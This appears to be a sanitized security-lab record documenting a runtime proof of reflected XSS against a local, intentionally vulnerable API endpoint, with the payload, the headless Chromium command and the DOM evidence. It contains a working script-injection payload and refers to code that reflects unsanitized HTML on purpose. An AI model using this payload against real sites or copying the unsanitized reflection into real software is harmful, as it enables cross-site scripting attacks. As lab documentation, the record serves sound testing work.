> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# verified_lab_flow_modern_api_xss_runtime_proof

Status: verified-impact / authorized local lab / browser runtime proof
Date: 2026-05-22
Route/tool: Windows Hermes control plane -> SSH/SCP -> `<attacker-vm>` -> Chromium -> local disposable target `http://127.0.0.1:18080`
Target implementation: `labs/modern_vuln_api/modern_vuln_api.py`
Artifacts: `<artifact-output-dir>/modern_api_wave2_20260522T022303Z/`
Sources mapped: OWASP A03 Injection / XSS, CWE-79, Exploit-DB/GitHub/HTB XSS workflow patterns

## Why this target was added

Juice Shop browser-backed XSS attempts produced candidate/reflection evidence but not a reliable runtime proof. This endpoint intentionally reflects unsanitized HTML so the lab can validate the runtime-proof harness itself.

## Verified flow

Payload:

```html
</div><script>document.body.setAttribute('data-xss','XSS_RUNTIME_MARKER')</script><div>
```

Kali Chromium execution:

```text
chromium --headless --disable-gpu --no-sandbox --virtual-time-budget=2000 --dump-dom <xss-url>
```

Evidence in DOM:

```html
<body data-xss="XSS_RUNTIME_MARKER">
```

## Impact

Level 3 lab impact: JavaScript executed in the victim browser context and mutated the DOM. This is runtime XSS proof, not merely payload reflection.

## Evidence

- `<artifact-output-dir>/modern_api_wave2_20260522T022303Z/xss/dom.txt`
- `<artifact-output-dir>/modern_api_wave2_20260522T022303Z/observations.jsonl`

## Boundaries

- Local disposable target only.
- No credential theft payload.
- No external callback.
- No persistence.
